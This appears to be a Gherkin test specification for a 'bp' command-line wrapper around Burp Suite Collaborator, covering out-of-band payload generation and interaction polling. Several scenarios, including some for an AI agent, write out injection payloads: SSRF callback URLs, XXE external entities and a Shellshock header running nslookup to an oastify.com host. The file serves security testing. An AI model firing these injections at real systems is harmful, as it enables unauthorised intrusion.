Feature: Collaborator — OAST payload generation and out-of-band interaction polling
  As a bug-bounty hunter or AI agent using `bp`,
  I want to generate Burp Collaborator payloads and poll for DNS/HTTP/SMTP interactions
  so that I can detect and prove blind SSRF, RCE, XXE, and other OOB vulnerabilities.

  # ─────────────────────────────────────────────────────────────────────────────
  # Domain: POST /collaborator/generate
  #          POST /collaborator/generate/batch
  #          GET  /collaborator/poll
  #          GET  /collaborator/poll/{id}
  #
  # Pro gate: ALL four endpoints return HTTP 503 SERVICE_UNAVAILABLE on Community.
  # State:    in-memory only — lost on Burp/extension restart.
  # Key flag: interactionId == id (local key, not a Burp UUID).
  #           timestamp = Instant.now() at poll time, not at interaction capture.
  #           /generate/batch and /poll/{id} are absent from /docs (OpenAPI 0.2.0).
  #           Poll errors are silently swallowed → found=false (HTTP 200).
  #           "id unknown" is indistinguishable from "no interaction yet".
  # ─────────────────────────────────────────────────────────────────────────────

  Background:
    Given Burp Suite Professional is running and the extension is loaded at http://127.0.0.1:8089
    And the Collaborator API is available (bp health confirms status ok)

  # ═══════════════════════════════════════════════════════════════════════════
  # §1  GENERATE — single payload
  # ═══════════════════════════════════════════════════════════════════════════

  @happy @pro
  Scenario: Generate a single Collaborator payload (table output, human DX)
    When I run:
      """
      bp collaborator generate --format table
      """
    Then the exit code is 0
    And stdout contains a table row with columns id and payload, for example:
      """
      id                       payload
      ──────────────────────────────────────────────────────────
      a1b2c3d4                 a1b2c3d4.oastify.com
      """
    And the payload field ends with ".oastify.com" or a Collaborator-server domain

  @happy @pro
  Scenario: Generate a single Collaborator payload (JSON mode, AX-friendly)
    When I run:
      """
      bp collaborator generate --format json
      """
    Then the exit code is 0
    And stdout is a single compact JSON line matching:
      """
      {"success":true,"data":{"id":"<8-char-prefix>","payload":"<id>.oastify.com","interactionId":"<id>"},"error":null}
      """
    And the JSON contains no pretty-print newlines (compact, AX-stable schema)

  @happy @pro
  Scenario: Generate a payload and print only the payload URL with --quiet
    When I run:
      """
      bp collaborator generate --quiet
      """
    Then the exit code is 0
    And stdout is exactly one line containing only the Collaborator URL, e.g.:
      """
      a1b2c3d4.oastify.com
      """

  @happy @pro
  Scenario: Generate a payload and extract only the id field with --fields
    When I run:
      """
      bp collaborator generate --fields id --format table
      """
    Then the exit code is 0
    And stdout contains only the id column:
      """
      id
      ────────
      a1b2c3d4
      """

  @happy @pro
  Scenario: Generate a payload using a curl-style write-out template for use in shell scripts
    When I run:
      """
      bp collaborator generate -w "%{payload}"
      """
    Then the exit code is 0
    And stdout is a single line with just the Collaborator payload domain, e.g.:
      """
      a1b2c3d4.oastify.com
      """

  @happy @pro @ledger
  Scenario: Generate a payload and record it in the Run Ledger with a tag
    When I run:
      """
      bp collaborator generate --tag oast-generate-ssrf-probe --format json
      """
    Then the exit code is 0
    And a Run Ledger entry is created with:
      | field     | value                    |
      | tag       | oast-generate-ssrf-probe |
      | burp_op   | POST /collaborator/generate |
      | status    | ok                       |
    And the ledger entry is visible via:
      """
      bp log --tag oast-generate-ssrf-probe --format json
      """

  @happy @pro @ledger
  Scenario: Generate a payload without recording it in the Run Ledger
    When I run:
      """
      bp collaborator generate --no-ledger --format json
      """
    Then the exit code is 0
    And no Run Ledger entry is created for this invocation
    And the collaborator payload is still returned in stdout

  # ═══════════════════════════════════════════════════════════════════════════
  # §2  GENERATE/BATCH — multiple payloads in one call
  # ═══════════════════════════════════════════════════════════════════════════

  @happy @pro
  Scenario: Generate 5 distinct Collaborator payloads in a single batch call
    When I run:
      """
      bp collaborator generate --batch 5 --format json
      """
    Then the exit code is 0
    And stdout is a single compact JSON line matching:
      """
      {"success":true,"data":{"payloads":[{"id":"...","payload":"...","interactionId":"..."},...],"count":5},"error":null}
      """
    And the data.payloads array has exactly 5 elements
    And all payload id values are distinct

  @happy @pro
  Scenario: Generate a batch of payloads and display them as a table
    When I run:
      """
      bp collaborator generate --batch 3 --format table
      """
    Then the exit code is 0
    And stdout contains a table with 3 rows, each showing a distinct id and payload:
      """
      id                       payload
      ──────────────────────────────────────────────────────────
      a1b2c3d4                 a1b2c3d4.oastify.com
      e5f6a7b8                 e5f6a7b8.oastify.com
      c9d0e1f2                 c9d0e1f2.oastify.com
      """

  @happy @pro
  Scenario: Generate a batch of payloads and extract only the payload column with --fields
    When I run:
      """
      bp collaborator generate --batch 4 --fields payload --format table
      """
    Then the exit code is 0
    And stdout contains exactly 4 payload domain lines (no id column)

  @happy @pro
  Scenario: Generate a batch with count=1 (default) via omitting --batch
    When I run:
      """
      bp collaborator generate --format json
      """
    Then the exit code is 0
    And the response is equivalent to generate --batch 1
    And data contains exactly one payload object (or a scalar id+payload at top level)

  @error @pro
  Scenario: Generate a batch with count=0 — edge case
    When I run:
      """
      bp collaborator generate --batch 0 --format json
      """
    Then the exit code is non-zero OR the response contains an empty payloads array
    And stdout (on error) contains:
      """
      {"success":false,"data":null,"error":{"code":"INVALID_REQUEST","message":"count must be >= 1"}}
      """

  @error @pro
  Scenario: Generate a batch with a negative count
    When I run:
      """
      bp collaborator generate --batch -3 --format json
      """
    Then the exit code is non-zero
    And stderr or stdout contains an error indicating count must be a positive integer

  @error @pro
  Scenario: Generate a batch with a non-integer count (type error — deserialization)
    When I run:
      """
      bp collaborator generate --batch abc --format json
      """
    Then the exit code is non-zero
    And stdout contains:
      """
      {"success":false,"data":null,"error":{"code":"INVALID_REQUEST","message":"..."}}
      """
    And the HTTP status from Burp would be 400 (SerializationException mapped to INVALID_REQUEST)

  @happy @pro @ledger
  Scenario: Generate a batch and tag the operation in the Run Ledger
    When I run:
      """
      bp collaborator generate --batch 10 --tag blind-ssrf-batch-10 --format json
      """
    Then the exit code is 0
    And 10 distinct payloads are returned
    And a Run Ledger entry is created with tag=blind-ssrf-batch-10 and burp_op=POST /collaborator/generate/batch

  # ═══════════════════════════════════════════════════════════════════════════
  # §3  POLL — sweep all interactions for this session
  # ═══════════════════════════════════════════════════════════════════════════

  @happy @pro
  Scenario: Poll all Collaborator interactions when none have occurred yet (empty result)
    When I run:
      """
      bp collaborator poll --format json
      """
    Then the exit code is 0
    And stdout is:
      """
      {"success":true,"data":{"interactions":[],"count":0},"error":null}
      """

  @happy @pro
  Scenario: Poll all interactions after an SSRF triggered a DNS callback (JSON, AX mode)
    Given the target application made an out-of-band DNS lookup to a Collaborator payload domain
    When I run:
      """
      bp collaborator poll --format json
      """
    Then the exit code is 0
    And stdout is a compact JSON line with at least one interaction, e.g.:
      """
      {"success":true,"data":{"interactions":[{"id":"a1b2c3d4","type":"DNS","interactionId":"a1b2c3d4","timestamp":"2026-06-16T10:23:45.000Z"}],"count":1},"error":null}
      """
    And the interaction type field is one of: DNS, HTTP, SMTP
    And the timestamp reflects Instant.now() at poll time (not capture time — per spec flag)

  @happy @pro
  Scenario: Poll all interactions and display as a human-readable table
    Given at least one HTTP interaction has been recorded by the Collaborator server
    When I run:
      """
      bp collaborator poll --format table
      """
    Then the exit code is 0
    And stdout contains a table with columns: id, type, interactionId, timestamp, e.g.:
      """
      id           type   interactionId   timestamp
      ──────────────────────────────────────────────────────────────────────
      a1b2c3d4     HTTP   a1b2c3d4        2026-06-16T10:23:45.000Z
      """

  @happy @pro
  Scenario: Poll all interactions and filter to only the type field with --fields
    When I run:
      """
      bp collaborator poll --fields type --format table
      """
    Then the exit code is 0
    And stdout contains only the type column values (DNS/HTTP/SMTP), one per interaction

  @happy @pro
  Scenario: Poll all interactions and extract type+id pair using -w template
    When I run:
      """
      bp collaborator poll -w "%{index} %{payload}"
      """
    Then the exit code is 0
    And each output line has the form "<index> <interactionId>" for every interaction found
    And if there are zero interactions, stdout is empty

  @happy @pro
  Scenario: Poll all interactions and count with --quiet (print only the count)
    When I run:
      """
      bp collaborator poll --quiet
      """
    Then the exit code is 0
    And stdout is a single integer representing the total number of interactions found

  @happy @pro
  Scenario: Poll returns interactions of type DNS, HTTP, and SMTP — all three types present
    Given the target triggered DNS, HTTP, and SMTP out-of-band interactions
    When I run:
      """
      bp collaborator poll --format json
      """
    Then the exit code is 0
    And the interactions array contains entries with type="DNS", type="HTTP", and type="SMTP"
    And each interaction has id, interactionId, type, and timestamp fields
    And interactionId equals id for every entry (per spec: interactionId == id)

  @happy @pro @ledger
  Scenario: Poll all interactions and record the sweep in the Run Ledger
    When I run:
      """
      bp collaborator poll --tag collaborator-sweep-r1 --format json
      """
    Then the exit code is 0
    And a Run Ledger entry is created with:
      | field   | value                        |
      | tag     | collaborator-sweep-r1        |
      | burp_op | GET /collaborator/poll       |
      | status  | ok                           |

  # ═══════════════════════════════════════════════════════════════════════════
  # §4  POLL/{id} — scoped poll for a specific payload
  # ═══════════════════════════════════════════════════════════════════════════

  @happy @pro
  Scenario: Poll a specific payload id that has received a DNS interaction
    Given a Collaborator payload with id "a1b2c3d4" was generated
    And a DNS lookup for "a1b2c3d4.oastify.com" has been observed
    When I run:
      """
      bp collaborator poll --id a1b2c3d4 --format json
      """
    Then the exit code is 0
    And stdout is a compact JSON line, e.g.:
      """
      {"success":true,"data":{"id":"a1b2c3d4","found":true,"interactions":[{"id":"a1b2c3d4","type":"DNS","interactionId":"a1b2c3d4","timestamp":"2026-06-16T10:23:45.000Z"}]},"error":null}
      """
    And data.found is true
    And data.interactions is non-empty

  @happy @pro
  Scenario: Poll a specific payload id that has NOT yet received any interaction
    Given a Collaborator payload with id "b2c3d4e5" was just generated
    And no out-of-band interaction has occurred for "b2c3d4e5" yet
    When I run:
      """
      bp collaborator poll --id b2c3d4e5 --format json
      """
    Then the exit code is 0
    And stdout is:
      """
      {"success":true,"data":{"id":"b2c3d4e5","found":false,"interactions":[]},"error":null}
      """
    And data.found is false (HTTP 200 — spec: errors silently swallowed, found=false)

  @happy @pro
  Scenario: Poll a payload id that does not exist — silent found=false (per spec)
    When I run:
      """
      bp collaborator poll --id zzzzzzzz --format json
      """
    Then the exit code is 0
    And stdout contains:
      """
      {"success":true,"data":{"id":"zzzzzzzz","found":false,"interactions":[]},"error":null}
      """
    And there is NO error field (spec: "id unknown" is indistinguishable from "no interaction yet")
    And the exit code is 0 (HTTP 200 — silent swallow)

  @happy @pro
  Scenario: Poll a specific payload id and display result as table
    Given a payload with id "c3d4e5f6" has received an HTTP interaction
    When I run:
      """
      bp collaborator poll --id c3d4e5f6 --format table
      """
    Then the exit code is 0
    And stdout contains a table row showing type=HTTP for interaction c3d4e5f6

  @happy @pro
  Scenario: Poll a specific payload id with --quiet to get a binary found/not-found signal
    When I run:
      """
      bp collaborator poll --id a1b2c3d4 --quiet
      """
    Then the exit code is 0
    And stdout is either "true" (interaction found) or "false" (not found)

  @happy @pro
  Scenario: Poll a specific payload id with -w template to extract interaction type
    Given payload "d4e5f6a7" has one DNS interaction
    When I run:
      """
      bp collaborator poll --id d4e5f6a7 -w "%{payload} %{status}"
      """
    Then the exit code is 0
    And stdout contains one line with the interaction identifier and its type signal

  @happy @pro @ledger
  Scenario: Poll a specific payload and record in the Run Ledger
    When I run:
      """
      bp collaborator poll --id a1b2c3d4 --tag poll-specific-a1b2c3d4 --format json
      """
    Then the exit code is 0
    And a Run Ledger entry is created with tag=poll-specific-a1b2c3d4 and burp_op=GET /collaborator/poll/a1b2c3d4

  # ═══════════════════════════════════════════════════════════════════════════
  # §5  PRO REQUIREMENT — graceful degradation on Community edition
  # ═══════════════════════════════════════════════════════════════════════════

  @error @community @pro
  Scenario: Generate a Collaborator payload on Burp Community — 503 expected
    Given Burp Suite Community Edition is running (no Collaborator API available)
    When I run:
      """
      bp collaborator generate --format json
      """
    Then the exit code is non-zero
    And stdout or stderr contains:
      """
      {"success":false,"data":null,"error":{"code":"SERVICE_UNAVAILABLE","message":"..."}}
      """
    And the error message indicates that the Collaborator API requires Burp Suite Professional

  @error @community @pro
  Scenario: Generate a batch on Burp Community — 503 expected
    Given Burp Suite Community Edition is running
    When I run:
      """
      bp collaborator generate --batch 5 --format json
      """
    Then the exit code is non-zero
    And stdout contains error code SERVICE_UNAVAILABLE

  @error @community @pro
  Scenario: Poll all interactions on Burp Community — 503 expected
    Given Burp Suite Community Edition is running
    When I run:
      """
      bp collaborator poll --format json
      """
    Then the exit code is non-zero
    And stdout contains:
      """
      {"success":false,"data":null,"error":{"code":"SERVICE_UNAVAILABLE","message":"..."}}
      """

  @error @community @pro
  Scenario: Poll a specific id on Burp Community — 503 expected
    Given Burp Suite Community Edition is running
    When I run:
      """
      bp collaborator poll --id a1b2c3d4 --format json
      """
    Then the exit code is non-zero
    And stdout contains error code SERVICE_UNAVAILABLE

  @error @community @pro
  Scenario: bp detects Community edition at startup and warns before any collaborator command
    Given Burp Suite Community Edition is running
    When I run:
      """
      bp collaborator generate --format json
      """
    Then the exit code is non-zero
    And stderr contains a human-readable warning, e.g.:
      """
      [bp] warning: collaborator requires Burp Suite Professional. Current edition: Community.
      """
    And the warning appears BEFORE attempting the REST call (pre-flight edition check)

  # ═══════════════════════════════════════════════════════════════════════════
  # §6  ERROR PATHS — Burp down, extension not loaded, network errors
  # ═══════════════════════════════════════════════════════════════════════════

  @error
  Scenario: Generate when Burp is not running — connection refused
    Given no process is listening on port 8089
    When I run:
      """
      bp collaborator generate --format json
      """
    Then the exit code is non-zero
    And stderr contains a message indicating connection refused or Burp is not reachable, e.g.:
      """
      [bp] error: cannot connect to Burp at http://127.0.0.1:8089 — Connection refused
      """

  @error
  Scenario: Poll when Burp is not running — connection refused
    Given no process is listening on port 8089
    When I run:
      """
      bp collaborator poll --format json
      """
    Then the exit code is non-zero
    And stderr contains connection refused error

  @error
  Scenario: Generate when the Collaborator client cannot be created (misconfigured Pro)
    Given Burp Professional is running but the Collaborator server is unreachable or misconfigured
    When I run:
      """
      bp collaborator generate --format json
      """
    Then the exit code is non-zero
    And stdout contains:
      """
      {"success":false,"data":null,"error":{"code":"SERVICE_UNAVAILABLE","message":"..."}}
      """
    And bp does not crash with an unhandled exception

  # ═══════════════════════════════════════════════════════════════════════════
  # §7  FULL BLIND SSRF WORKFLOW — generate → inject via fuzz → poll
  # ═══════════════════════════════════════════════════════════════════════════

  @happy @pro @fuzz
  Scenario: Full blind SSRF detection workflow — generate payload, inject via repeater, poll for DNS
    # Step 1: Generate a Collaborator payload
    Given I run:
      """
      bp collaborator generate --quiet
      """
    And the output is stored in shell variable OAST_HOST (e.g. "a1b2c3d4.oastify.com")
    And the id part "a1b2c3d4" is extracted

    # Step 2: Inject the payload into the target via repeater (body field)
    When I run:
      """
      bp repeater send \
        --method POST \
        --url https://vulnerable.example.com/api/fetch \
        --header "Content-Type: application/json" \
        --body '{"url":"http://a1b2c3d4.oastify.com/ssrf-probe"}' \
        --format json
      """
    Then the exit code is 0
    And the HTTP response from the target is received (status in data.response.statusCode)

    # Step 3: Wait and poll for the DNS interaction (with retry)
    When I run:
      """
      bp collaborator poll --id a1b2c3d4 --format json
      """
    Then either data.found is true (SSRF confirmed via DNS callback)
    Or data.found is false (interaction not yet received — retry needed)

  @happy @pro @fuzz
  Scenario: Full blind SSRF workflow using fuzz to inject Collaborator payload across multiple endpoints
    Given a Collaborator payload "e5f6a7b8.oastify.com" has been generated (id=e5f6a7b8)
    And a base HTTP request with requestId=7 is in the proxy history
    When I run:
      """
      bp fuzz \
        --id 7 \
        --pos body:url \
        --type sniper \
        --payloads "http://e5f6a7b8.oastify.com/path1" "http://e5f6a7b8.oastify.com/path2" \
        --format json
      """
    Then the exit code is 0
    And fuzz results are returned for each payload
    When I then run:
      """
      bp collaborator poll --id e5f6a7b8 --format json
      """
    Then if data.found is true, SSRF is confirmed at the injected position

  @happy @pro @fuzz
  Scenario: Blind SSRF detection via fuzz quick-fuzz with Collaborator payload
    Given proxy history request id=12 contains a URL parameter named "redirect"
    And a fresh Collaborator payload "f7a8b9c0.oastify.com" has been generated (id=f7a8b9c0)
    When I run:
      """
      bp fuzz quick \
        --id 12 \
        --param redirect \
        --payloads "http://f7a8b9c0.oastify.com" \
        --format json
      """
    Then the exit code is 0
    And result shows the HTTP response from injecting the Collaborator URL
    When I poll:
      """
      bp collaborator poll --id f7a8b9c0 --format json
      """
    Then the DNS or HTTP interaction confirms out-of-band contact

  @happy @pro @fuzz
  Scenario: Blind XXE workflow — inject Collaborator payload via XML body using repeater
    Given a Collaborator payload id "b9c0d1e2" maps to "b9c0d1e2.oastify.com"
    When I run:
      """
      bp repeater send \
        --method POST \
        --url https://api.vulnerable.example.com/import \
        --header "Content-Type: application/xml" \
        --body '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://b9c0d1e2.oastify.com/xxe">]><root>&xxe;</root>' \
        --format json
      """
    Then the exit code is 0
    And the HTTP response is captured
    When I poll:
      """
      bp collaborator poll --id b9c0d1e2 --format json
      """
    Then if data.found is true with type=HTTP, XXE OOB exfiltration is confirmed

  @happy @pro @fuzz
  Scenario: Blind RCE workflow — inject Collaborator payload via header-based OS command injection
    Given a fresh Collaborator payload id "c0d1e2f3" maps to "c0d1e2f3.oastify.com"
    And proxy history entry requestId=99 is a request with a User-Agent header
    When I run:
      """
      bp repeater send \
        --id 99 \
        --modify-header "User-Agent: () { :; }; /usr/bin/nslookup c0d1e2f3.oastify.com" \
        --format json
      """
    Then the exit code is 0
    When I poll:
      """
      bp collaborator poll --id c0d1e2f3 --format json
      """
    Then if data.found is true with type=DNS, a Shellshock or command injection vector is confirmed

  @happy @pro @fuzz
  Scenario: Batch Collaborator payload generation for multi-endpoint SSRF sweep
    When I run:
      """
      bp collaborator generate --batch 5 --fields id,payload --format json
      """
    Then the exit code is 0
    And 5 distinct id+payload pairs are returned
    When each payload is injected into a different endpoint parameter via repeater or fuzz
    And after a wait period I run:
      """
      bp collaborator poll --format json
      """
    Then any interaction in data.interactions reveals which endpoint triggered the SSRF callback

  @happy @pro @fuzz
  Scenario: Poll loop — retry polling until an interaction is received or timeout
    Given a Collaborator payload id "d1e2f3a4" was just injected
    When I run a polling loop:
      """
      for i in $(seq 1 10); do
        RESULT=$(bp collaborator poll --id d1e2f3a4 --format json)
        echo "$RESULT" | grep '"found":true' && break
        sleep 5
      done
      """
    Then if an interaction arrives within 50 seconds, the loop exits with found=true
    And the final poll output is a compact JSON line confirming the interaction type

  # ═══════════════════════════════════════════════════════════════════════════
  # §8  AGENT MODE (AX) — AI agent calling bp programmatically
  # ═══════════════════════════════════════════════════════════════════════════

  @happy @pro
  Scenario: AI agent generates a Collaborator payload in JSON mode and parses the id
    When the agent runs:
      """
      bp collaborator generate --format json --no-ledger
      """
    Then stdout is exactly one compact JSON line (no newlines inside the JSON object)
    And the agent can extract data.id and data.payload using a JSON parser
    And the schema is stable: success (Boolean), data.id (String), data.payload (String), data.interactionId (String), error (null)

  @happy @pro
  Scenario: AI agent polls for a specific id in JSON mode and branches on found
    When the agent runs:
      """
      bp collaborator poll --id a1b2c3d4 --format json --no-ledger
      """
    Then stdout is a single compact JSON line
    And the agent reads data.found (Boolean) to decide whether to escalate the finding
    And the agent reads data.interactions[0].type to classify the interaction as DNS, HTTP, or SMTP
    And the schema is stable even when found=false (interactions is always an array, never null)

  @happy @pro
  Scenario: AI agent uses --format json across generate+poll pipeline without TTY
    Given the agent is running in a non-TTY piped context
    When the agent runs without --format flag:
      """
      bp collaborator generate | jq -r '.data.id'
      """
    Then bp defaults to JSON mode (not table) because output is piped
    And the output is parseable by jq with no extra formatting characters

  @happy @pro
  Scenario: AI agent generates a batch and maps each payload to a target endpoint
    When the agent runs:
      """
      bp collaborator generate --batch 3 --format json --no-ledger
      """
    Then stdout is a single compact JSON line
    And data.payloads is a JSON array of length 3
    And the agent assigns payload[0] to endpoint /api/webhook, payload[1] to /api/import, payload[2] to /api/redirect
    And after injection the agent polls each id individually:
      """
      bp collaborator poll --id <id0> --format json --no-ledger
      bp collaborator poll --id <id1> --format json --no-ledger
      bp collaborator poll --id <id2> --format json --no-ledger
      """
    And correlates found=true responses to the specific endpoint that triggered the callback

  @happy @pro
  Scenario: AI agent uses -w template to extract minimal data for decision making
    When the agent runs:
      """
      bp collaborator poll --id a1b2c3d4 -w "%{status} %{payload}"
      """
    Then stdout is a single line like "true a1b2c3d4" or "false a1b2c3d4"
    And the agent parses found (field 1) and id (field 2) without a JSON parser

  # ═══════════════════════════════════════════════════════════════════════════
  # §9  SCENARIO OUTLINES — parameterised interaction types and counts
  # ═══════════════════════════════════════════════════════════════════════════

  @happy @pro
  Scenario Outline: Poll returns the correct interaction type for each OOB channel
    Given a Collaborator payload "<payload_id>" has triggered a "<interaction_type>" callback
    When I run:
      """
      bp collaborator poll --id <payload_id> --format json
      """
    Then the exit code is 0
    And data.found is true
    And data.interactions[0].type equals "<interaction_type>"

    Examples:
      | payload_id | interaction_type |
      | a1b2c3d4   | DNS              |
      | b2c3d4e5   | HTTP             |
      | c3d4e5f6   | SMTP             |

  @happy @pro
  Scenario Outline: Generate different batch sizes and verify count in response
    When I run:
      """
      bp collaborator generate --batch <count> --format json
      """
    Then the exit code is 0
    And data.payloads has exactly <count> entries
    And all payload id values are distinct

    Examples:
      | count |
      | 1     |
      | 2     |
      | 5     |
      | 10    |
      | 20    |

  @error @pro
  Scenario Outline: Batch generate with invalid count values returns appropriate errors
    When I run:
      """
      bp collaborator generate --batch <bad_count> --format json
      """
    Then the exit code is non-zero OR stdout contains an error or empty payloads array
    And the error code is one of: INVALID_REQUEST, SERVICE_UNAVAILABLE

    Examples:
      | bad_count |
      | 0         |
      | -1        |
      | -100      |

  @happy @pro
  Scenario Outline: Generate payload and inject into different SSRF injection points
    Given a Collaborator payload "<payload_id>" maps to "<payload_domain>"
    When I run:
      """
      bp repeater send \
        --method <method> \
        --url <target_url> \
        --header "Content-Type: <content_type>" \
        --body '<body_template>' \
        --format json
      """
    Then the repeater send returns HTTP 200 or 5xx from the target
    When I poll:
      """
      bp collaborator poll --id <payload_id> --format json
      """
    Then the interaction type in data.interactions[0].type reflects the SSRF vector

    Examples:
      | payload_id | payload_domain              | method | target_url                                       | content_type        | body_template                                                             |
      | a1b2c3d4   | a1b2c3d4.oastify.com        | POST   | https://app.example.com/api/fetch                | application/json    | {"url":"http://a1b2c3d4.oastify.com"}                                    |
      | b2c3d4e5   | b2c3d4e5.oastify.com        | POST   | https://app.example.com/api/pdf                  | application/json    | {"template":"http://b2c3d4e5.oastify.com/template.html"}                 |
      | c3d4e5f6   | c3d4e5f6.oastify.com        | POST   | https://api.example.com/webhook/register         | application/json    | {"callback":"http://c3d4e5f6.oastify.com/hook"}                          |
      | d4e5f6a7   | d4e5f6a7.oastify.com        | POST   | https://app.example.com/import/xml               | application/xml     | <?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://d4e5f6a7.oastify.com">]><r>&x;</r> |
      | e5f6a7b8   | e5f6a7b8.oastify.com        | GET    | https://app.example.com/proxy?target=http://e5f6a7b8.oastify.com | application/json | (none) |

  # ═══════════════════════════════════════════════════════════════════════════
  # §10  SPEC FLAGS AND KNOWN BEHAVIOURS — documented caveats
  # ═══════════════════════════════════════════════════════════════════════════

  @happy @pro
  Scenario: Verify interactionId equals id in the poll response (spec-documented identity)
    Given a Collaborator payload with id "f6a7b8c9" has triggered a DNS interaction
    When I run:
      """
      bp collaborator poll --id f6a7b8c9 --format json
      """
    Then the exit code is 0
    And in each interaction object: data.interactions[N].interactionId == data.interactions[N].id
    And data.interactions[N].id equals "f6a7b8c9"
    # Spec note: interactionId is a local key, NOT a UUID from the Burp Collaborator server

  @happy @pro
  Scenario: Verify timestamp in poll response reflects poll time, not interaction capture time
    Given a DNS interaction for payload "a7b8c9d0" occurred 10 minutes ago
    When I run:
      """
      bp collaborator poll --id a7b8c9d0 --format json
      """
    Then the exit code is 0
    And data.interactions[0].timestamp is close to the current time (Instant.now() at poll)
    And the timestamp does NOT reflect the time the DNS lookup actually occurred
    # Spec flag: timestamp = Instant.now() at poll time — this is a known limitation

  @happy @pro
  Scenario: Verify poll/{id} silently returns found=false for unknown ids (no error thrown)
    When I run:
      """
      bp collaborator poll --id 00000000 --format json
      """
    Then the exit code is 0
    And data.found is false
    And success is true
    And error is null
    # Spec: poll errors silently swallowed → found=false, HTTP 200
    # "id unknown" is indistinguishable from "no interaction yet"

  @happy @pro
  Scenario: Verify /generate/batch and /poll/{id} are absent from OpenAPI /docs but still functional
    When I run:
      """
      bp collaborator generate --batch 2 --format json
      """
    Then the exit code is 0
    And the endpoints work despite being absent from GET /docs (OpenAPI 0.2.0 is incomplete)
    # bp MUST NOT rely on /docs for endpoint discovery — spec marks /docs as incomplete

  @happy @pro
  Scenario: Verify in-memory state reset — payloads generated before extension reload are not pollable after
    Given a Collaborator payload "b8c9d0e1" was generated before the Burp extension was reloaded
    When the Burp extension is reloaded (state reset)
    And I run:
      """
      bp collaborator poll --id b8c9d0e1 --format json
      """
    Then data.found is false (the in-memory interaction state was lost on reload)
    And bp handles this gracefully without error

  # ═══════════════════════════════════════════════════════════════════════════
  # §11  OUTPUT MODEL CONSISTENCY — same data, different formats
  # ═══════════════════════════════════════════════════════════════════════════

  @happy @pro
  Scenario: Same generate result rendered in all supported output formats
    Given a Collaborator payload with id "c9d0e1f2" and payload "c9d0e1f2.oastify.com"

    When I run with --format json:
      """
      bp collaborator generate --format json
      """
    Then stdout is compact single-line JSON with all fields (AX stable)

    When I run with --format table:
      """
      bp collaborator generate --format table
      """
    Then stdout is a human-aligned table with id and payload columns

    When I run with --format raw:
      """
      bp collaborator generate --format raw
      """
    Then stdout is the raw Burp response bytes (may include HTTP envelope)

    When I run with --format quiet:
      """
      bp collaborator generate --quiet
      """
    Then stdout is exactly the payload domain on one line: "c9d0e1f2.oastify.com"

  @happy @pro
  Scenario: Poll output with -w template selects custom fields per interaction
    Given at least two interactions have been recorded
    When I run:
      """
      bp collaborator poll -w "%{index} %{payload} %{status}"
      """
    Then each line in stdout corresponds to one interaction
    And the format is: "<index> <interactionId> <type>" (one line per interaction)
    And lines are separated by newlines with no extra whitespace

  @happy @pro
  Scenario: --fields flag narrows output columns on poll result
    When I run:
      """
      bp collaborator poll --fields id,type --format table
      """
    Then stdout contains only two columns: id and type
    And no other fields (interactionId, timestamp) appear in the output

  # ═══════════════════════════════════════════════════════════════════════════
  # §12  INTEGRATION WITH REPEATER — inject payload, verify via poll
  # ═══════════════════════════════════════════════════════════════════════════

  @happy @pro @fuzz
  Scenario: Use Collaborator payload with repeater batch to probe multiple endpoints simultaneously
    Given Collaborator payloads:
      | id       | payload                    |
      | aa11bb22 | aa11bb22.oastify.com       |
      | cc33dd44 | cc33dd44.oastify.com       |
    When I run:
      """
      bp repeater send --batch \
        --requests '[
          {"request":{"method":"POST","url":"https://app.example.com/endpoint1","headers":[{"name":"Content-Type","value":"application/json"}],"body":"{\"url\":\"http://aa11bb22.oastify.com\"}"}},
          {"request":{"method":"POST","url":"https://app.example.com/endpoint2","headers":[{"name":"Content-Type","value":"application/json"}],"body":"{\"target\":\"http://cc33dd44.oastify.com\"}"}}
        ]' \
        --format json
      """
    Then the exit code is 0
    And 2 responses are returned (batch is sequential per spec)
    When I run:
      """
      bp collaborator poll --format json
      """
    Then any interaction with id "aa11bb22" maps to endpoint1 triggering SSRF
    And any interaction with id "cc33dd44" maps to endpoint2 triggering SSRF

  @happy @pro @fuzz
  Scenario: Inject Collaborator URL into every HTTP header position using intruder quick-fuzz
    Given a request with requestId=15 that includes multiple headers
    And a Collaborator payload "ee55ff66.oastify.com" (id=ee55ff66)
    When I run:
      """
      bp fuzz quick \
        --id 15 \
        --param X-Forwarded-For \
        --payloads "ee55ff66.oastify.com" \
        --format json
      """
    Then the exit code is 0
    When I poll:
      """
      bp collaborator poll --id ee55ff66 --format json
      """
    Then a DNS interaction found=true confirms the server resolved the X-Forwarded-For header value

  # ═══════════════════════════════════════════════════════════════════════════
  # §13  EDGE CASES — large batch, very large poll, state boundaries
  # ═══════════════════════════════════════════════════════════════════════════

  @happy @pro
  Scenario: Generate a large batch (100 payloads) — verifying count and distinct ids
    When I run:
      """
      bp collaborator generate --batch 100 --format json
      """
    Then the exit code is 0
    And data.payloads has exactly 100 elements
    And all 100 id values are distinct strings
    And all 100 payload domain values are distinct and end in ".oastify.com"

  @happy @pro
  Scenario: Poll after many interactions have accumulated — verify all returned without truncation
    Given 50 distinct Collaborator payloads have each received a DNS interaction
    When I run:
      """
      bp collaborator poll --format json
      """
    Then the exit code is 0
    And data.interactions contains all 50 interactions
    And data.count equals 50

  @happy @pro
  Scenario: Generate payload with --no-ledger suppresses Run Ledger recording
    When I run:
      """
      bp collaborator generate --no-ledger --format json
      """
    Then the exit code is 0
    And the payload is returned normally in stdout
    And no entry appears in bp log for this invocation

  @happy @pro
  Scenario: Multiple sequential generate calls return distinct payloads every time
    When I run bp collaborator generate three times sequentially
    Then each invocation returns a different id value
    And no two payload domains are the same within the same session
